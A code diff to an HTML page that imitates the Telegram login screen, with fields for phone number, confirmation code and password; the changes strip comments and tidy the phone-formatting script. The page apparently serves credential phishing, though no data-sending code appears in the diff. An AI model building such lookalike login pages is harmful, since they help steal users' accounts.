@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram – Увійти</title>
+    <title>Telegram</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -119,7 +119,6 @@
     <h1 id="AppName">Telegram</h1>
     <p id="AppSubname">Введите Ваш номер телефона</p>
 
-    <!-- Крок 1: країна -->
     <div class="field" id="countryField">
         <select id="countrySelect" autofocus>
             <option value="+7">Российская Федерация (+7)</option>
@@ -135,17 +134,17 @@
         <div class="arrow">▼</div>
     </div>
 
-    <!-- Крок 1: телефон -->
+
     <div class="field" id="phoneWrapper">
         <input type="tel" id="phoneField" placeholder="Номер телефону">
     </div>
 
-    <!-- Крок 2: код -->
+
     <div class="field hidden" id="codeWrapper">
         <input type="text" id="codeField" placeholder="Код підтвердження" maxlength="6">
     </div>
 
-    <!-- Крок 3: пароль -->
+
     <div class="field hidden" id="passwordWrapper">
         <input type="password" id="passwordField" placeholder="Пароль">
     </div>
@@ -321,20 +320,18 @@
         return countrySelect.value; 
     }
 
-    // Форматирование номера
-    function formatPhoneNumber() {
-        let countryCode = getCountryCode(); // ← вот здесь всегда свежий код!
 
-        // Убираем всё кроме цифр
+    function formatPhoneNumber() {
+        let countryCode = getCountryCode(); 
+
+
         let digits = phoneField.value.replace(/\D/g, '');
 
-        // Если номер уже начинается с текущего кода страны — убираем его из цифр
         const codeWithoutPlus = countryCode.slice(1);
         if (digits.startsWith(codeWithoutPlus)) {
             digits = digits.slice(codeWithoutPlus.length);
         }
 
-        // Формируем: код + пробел + 3 цифры + пробел + 3 цифры + пробел + остальное
         let formatted = countryCode;
 
         if (digits.length > 0) {
@@ -354,16 +351,14 @@
 
 
     countrySelect.addEventListener('change', () => {
-    phoneField.value = countrySelect.value;   // полностью очищаем поле
-    phoneField.focus();                   // сразу можно вводить цифры
+    phoneField.value = countrySelect.value;  
+    phoneField.focus();                
 });
 
-    // При вводе в поле телефона
     phoneField.addEventListener('input', () => {
         formatPhoneNumber();
     });
 
-    // Курсор в конец при фокусе
     phoneField.addEventListener('focus', () => {
         setTimeout(() => {
             phoneField.setSelectionRange(phoneField.value.length, phoneField.value.length);
